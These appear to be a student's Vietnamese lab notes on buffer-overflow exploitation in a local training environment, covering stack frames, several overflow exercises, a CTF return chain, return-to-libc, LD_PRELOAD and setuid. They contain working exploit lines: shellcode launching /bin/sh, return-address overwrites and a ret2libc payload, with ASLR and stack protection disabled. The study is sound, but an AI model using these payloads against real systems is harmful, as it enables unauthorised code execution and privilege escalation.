disas main
b *0x0804846b
r $(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80'+ 'a'*41+ '\xff\xff\xff\xff')")
r $(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80'+ 'a'*41+ '\xff\xff\xff\xff')")
x/80xb $esp
set *0xffffd728 =$esp
continue
x
x/80xb $esp
exit
exit
quit

- Tạo image trong folder có Dockerfile
`_StackFrame_`
- Trước khi hàm main được gọi, chương trình sẽ có vùng nhớ stack của hệ thống (PREVIOUS STACK FRAME)
- Khi hàm main được gọi, các đối số argv và argc sẽ được push vào trong stack theo thứ tự 
    + argv chứa địa chỉ của chuỗi tham số
    + argc số đối số nhập trên dòng lệnh chương trình được nhập vào  
    + Mỗi ô là 4 byte (32bit)
- Sau đó eip (Return address) và ebp (Frame pointer) sẽ được push vào stack 
- Sau đó trong hàm main thực hiện lệnh 
    + push ebp
    + mov ebp, esp ( lấy ebp = giá trị esp)
- Sau đó ebp bị trừ đi bằng với số ô nhớ trong hàm main 
- Các biến local vars trong hàm main sẽ được push vào

docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab


`flag.c`
|      |    
|      |buffer[16]
|      |
|      |    
|      |
|      |
|      |flag
|      |ebp(Frame pointer)
|      |eip(return address)
|      |argc
|______|argv
- Nếu buffer chứa > 16 ký tự sẽ xảy ra trg hợp buffer overflow và ghi đè xuống biến flag
- Command: 
    + gcc -g flag.c -o flag.out -fno-stack-protector -mpreferred-stack-boundary=2
    + ./flag.out 123456789 (lúc này argc = 123456789, còn argv[0] = ./flag, argv[1] = 123456789)
    + ./flag.out $(python -c "print('a'*16)")
- `gdb` Command
    + gdb flag.out
    + disas main
    + r $(python -c "print('a'*18)")
    + Đặt breakpoint sau lệnh sub esp và sau khi sao chép chuỗi: break *0x0804843e break *0x0804845d
    + x/32xb $esp: để xem 32byte(8 ô stack frame) từ esp đi lên 
    + continue để tiếp tục, sau đó sẽ sao chép chuỗi
    + x/32xb $esp: để xem 32byte(8 ô stack frame) từ esp đi lên :
    0xffffd744:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
    0xffffd74c:     0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
    0xffffd754:     0x61    0x61    0x00    0x00    0x00    0x00    0x00    0x00
    0xffffd75c:     0x47    0xe6    0xe2    0xf7    0x02    0x00    0x00    0x00
    + 16 byte đầu là 16 ký tự a trong chuỗi, 2 byte còn lại là 2 byte tràn sang biến flag


`pattern`
- Phải nhập giá trị cho  biến pattern có giá trị là 62426141
- `gdb` command
    +  ./pattern.out $(python -c "print('a'*16 + 'bBaA')")
    +  ./pattern.out $(python -c "print('a'*16 + '\x62\x42\x61\x41')")
`Stack Frame`
|           |    
|           |buffer[16]
|           |
|           |    
|           |
|           |
|62 42 61 41|pattern(Theo nguyên tắc little edian phải ghi ngược lại)
|           |ebp(Frame pointer)
|           |eip(return address)
|           |argc
|___________|argv


`bof2`
- `gdb` command
    +  python -c "print('A'*40 + '\xef\xbe\xad\xde')" | ./bof2.out

`bof3`
- `gdb` command
    +  đầu tiên vào gdb để lấy địa chỉ của hàm shell: gdb bof3.out
    +  sau đó gõ lệnh info address shell, sẽ có dc địa chỉ hàm shell là 0x804845b 
    +  python -c "print('A'*128 + '\x5b\x84\x04\x08')" | ./bof3.out

`bof3`
- `gdb` command
    +  python -c "print('A'*204 + '\x6b\x84\x04\x08')" | ./bof1.out (nhân 204 vì thêm 4 byte để xuống được eip)
`ctf`
`Stack Frame`
- Truyền địa chỉ của hàm myfunc vào return address của hàm vuln như bình thường 
- Tuy nhiên hàm myfunc có 2 đối số là p và q
- Khi `disas myfunc` ta thấy 
    +   0x0804856e <+83>:    cmp    DWORD PTR [ebp+0x8],0x4081211
    +   0x08048586 <+107>:   cmp    DWORD PTR [ebp+0xc],0x44644262
=> điều này cho thấy, kể cả khi truyền vào ko có parameter thì nó vẫn sẽ ngẫu nhiên so sánh 2 biến p và q dựa vào vị trí ebp+0x8 và ebp+0xc (nếu là hàm bình thường thì 2 vị trí này là 2 vị trí của 2 parameter khi truyền vào). Vì vậy ta sẽ truyền giá trị của p và q vào vị trí ebp+0x8 và ebp+0xc.

-Cần phải xem khi hàm myfunc dc gọi thì ebp sẽ nằm ở đâu
- Khi hàm vuln kết thúc sẽ có lệnh leave và ret
    + leave: 
        .mov esp,ebp -> đưa esp từ top-stack về base(ebp) => giải phóng toàn bộ vùng nhớ local của hàm vuln
        .pop ebp -> khi pop ebp thì giá trị ebp sẽ dc chép vào ebp trỏ, còn esp sẽ trỏ vô retaddr, và sau đó retaddr dc pop ra, lúc này sẽ chuyển điều khiển cho hàm myfunc, còn esp trỏ xuống parameter của hàm vuln
- Khi vào hàm myfunc thì sẽ có 3 lệnh quen thuộc:
    + push ebp (lúc này esp sẽ chỉ lên đây)
    + mov ebp,esp
    + sub esp

`Stack-frame` của vuln
    |      |    
    |      |buf[100]
    |      |
    |      |    
    |      |
    |      |
    |      |
    |      |ebp(Frame pointer)
    |      |eip(return address)
    |______|s
- "print('A'*104 + '\x1b\x85\x04\x08' + '\xe0\x83\x04\x08' + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')"

    +  A*104 là tới ebp
    + '\x1b\x85\x04\x08' là địa chỉ của myfunc => return address = địa chỉ myfunc
    + '\xe0\x83\x04\x08' đây là giá trị của hàm hệ thống exit, ta sẽ gán nó với biến con trỏ s, nhưng cũng sẽ là return address của myfunc (vì eip luôn nằm trên ebp, nên mặc định biến con trỏ s sẽ dc xem là return address) -> xóa dấu vết
    + 8 bit còn lại là lần của p và q 



`Stack-frame` của myfunc
    |      |    
    |      |
    |      |
    |      |    
    |      |
    |      |
    |ebp cũ|
    |  ebp |ebp(Frame pointer),esp đều trỏ tới đây 
    |   s  |ret(return address) 
    |      |p 
    |______|q
- `vuln`: 0x080485ad
- `myfunc`: 0x0804851b
- `exit` : 0x080483e0 = '\xe0\x83\x04\x08'
    - `gdb` command
    +  ./ctf.out $(python -c "print('A'*104 + '\x1b\x85\x04\x08' + '\xe0\x83\x04\x08' + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")


/bin/sh -> ra dấu nhắc shell

`Return to libC`
`Idea`: Chèn địa chỉ hàm System trong libC để chèn vào return address,Chèn data vào stack là 1 chuỗi thực thi
- first step: lấy địa chỉ của system(chỉ có khi chạy chương trình, ;libC chỉ load khi chạy chương trình => cần start chương trình), tiếp theo tìm địa chỉ chuỗi /bin/sh, và hàm exit
- `gdb` command
    + sudo sysctl -w kernel.randomize_va_space=0
    + gcc -g vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2
    + gdb -q vuln.out
    + disas main
    + start
    + p system -> 0xf7e50db0
    + find /bin/sh -> 0xf7f71b2b
    + p exit -> 0xf7e449e0
    + exit
    + ./vuln.out $(python -c "print('A'*68 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x2b\x1b\xf7\xf7')")
        .chèn địa chỉ system vào return address, exit vào dưới (là return address của hàm system), địa chỉ /bin/sh 

`fmtv`




`OS`
`Thay đổi biến môi trường`
- Khai báo biến shell: MYVAR=/home/quang đây là biến shell, biến shell và biến môi trường độc lập với nhau
- echo $tenbien để xem giá trị của 1 biến 
=> khi gõ lệnh seed@3a4aa23aa7cb:~/seclabs/bof$ env|grep MYVAR thì sẽ ko tìm thấy vì biến shell và biến môi trường độc lập với nhau
- env|grep HOME lọc ra trong biến môi trường có những lệnh có HOME thì lọc ra 
=> khi mở một shell mới, những biến môi trường dc copy sang, còn biến shell thì ko dc copy sang
- để tạo biến môi trường, thêm từ khóa exported 
- đây là parent process: seed@3a4aa23aa7cb:~/seclabs/bof$, đây là child process: seed@3a4aa23aa7cb:~/seclabs/bof$ /bin/dash\
    + những thay đổi trong child process sẽ ko ảnh hưởng tới parent process, child process sẽ copy những biến môi trường của parent process qua
    + ví dụ: 
        . seed@3a4aa23aa7cb:~/seclabs/bof$ /bin/dash
        . printenv lúc này biến HOME=/home/seed
        . $ HOME="myhome" thay đổi, lúc này biến HOME=myhome
        . exit và printenv thì ở process cha HOME=/home/seed, giá trị HOME ko thay đổi 
-> Trong tấn công return to libC, lấy chuỗi /bin/sh trong vùng nhớ system, tuy nhiên nếu muốn lấy một chuỗi khác và lỡ như chuỗi đó ko nằm trong system, vậy thì đây là cách để có thể đưa 1 biến ở bên ngoài vào chương trình để có thể sử dụng biến đó -> ĐÂY LÀ 1 CÁCH CHUYỀN THAM SỐ CHO INJECT CODE   


`mytest.c`
- Khi sử dụng lệnh gcc -c sleep.c, bạn chỉ yêu cầu GCC thực hiện biên dịch mã nguồn C thành file đối tượng .o (object file). Quá trình này sẽ chuyển đổi mã nguồn thành mã máy, nhưng chưa thực hiện liên kết (linking) với các thư viện hoặc thành phần khác.
- File đối tượng này có thể chứa mã nguồn của một hàm hoặc nhiều hàm, nhưng nó chưa được liên kết vào chương trình chính. Điều này có nghĩa là GCC không cần tìm hàm main() hay bất kỳ điểm khởi đầu nào. Thay vào đó, sleep.o chỉ là một phần mã máy có thể được liên kết vào chương trình khác sau này.
=> Do đó, quá trình này không cần liên kết, và việc chỉ biên dịch là đủ.
- Câu lệnh gcc -shared -o mylib.so.1.0 sleep.o biên dịch file đối tượng sleep.o thành một thư viện chia sẻ có tên là mylib.so.1.0. Thư viện chia sẻ này có thể được sử dụng bởi các chương trình khác và có thể được nạp bằng cách sử dụng cơ chế như LD_PRELOAD để ghi đè hàm sleep() chuẩn của hệ thống với hàm tùy chỉnh mà bạn đã viết trong sleep.c.
- `LD_PRELOAD` cho phép bạn tải thư viện của mình trước, ghi đè lên các hàm hệ thống chuẩn.


`gdb`
- gcc mytest.c -o mytest.o
- ./mytest.o
- gcc -c sleep.c
- gcc -shared -o mylib.so.1.0 sleep.o
- export LD_PRELOAD=./mylib.so.1.0
- ./mytest.o

`setuid`
- những file có quyền thực thi được là những file có màu xanh ( những file có quyền x ( execute ))
- ví dụ: rxwr-xr-x seed(owner) seed(group owner) mytest
    + owner: rxw -> read excute write
    + group owner: execute read
    + other users: execute
- gõ lệnh id để cho biết hiện tại ta là user nào và ta có quyền gì 
    + uid=1000(seed) gid=1000(seed) groups=1000(seed),27(sudo). userid là 1000 và có quyền seed
- whereis id cho biết lệnh id nào ở đâu trong hệ thống 
- ls -l /usr/bin/id -> xem lệnh /usr/bin/id có owner là ai và có quyền gì 
    +-rwxr-xr-x 1 root root 38716 Feb 18  2016 /usr/bin/id quyền sở hữu của user root
- cp /usr/bin/id myid copy file vào myid
- ls -l myid
    + -rwxr-xr-x 1 seed seed 38716 Sep 17 13:41 myid giống trên nhưng thay đổi thành seed 
- sudo chown root myid -> đổi quyền sở hữu thành root
- ls -l myid -> -rwxr-xr-x 1 root seed 38716 Sep 17 13:41 myid1 -> đã đổi thành công
- ./myid -> uid=1000(seed) gid=1000(seed) groups=1000(seed),27(sudo) -> vẫn ko thay đổi, vẫn chỉ chạy ở quyền user seed
- sudo chmod 4755 myid1 
    + r(4)w(2)x(1) => 4755 = rwxr-xr-x (4 là bật bit uid)
- ls -l myid1 -> lúc này đã đổi thành  -rwsr-xr-x
- ./myid1 -> uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),27(sudo)
    + euid -> effective uid -> chạy theo quyền của người sở hữu, mà ng sở hữu lúc này là root 


--> áp dụng tương tự với lệnh shell, lúc này lệnh shell có thể thực thi với quyền seed -> thay đổi owner và setuid để có thể thực thi với quyền root (/sh)
    4           7       5   5
uid gid sticky owner-group-other
-------------- -----------------
    3 bit           9bit 
- uid : 1 -> bật uid bit -> ctrinh dc chạy quyền owner 



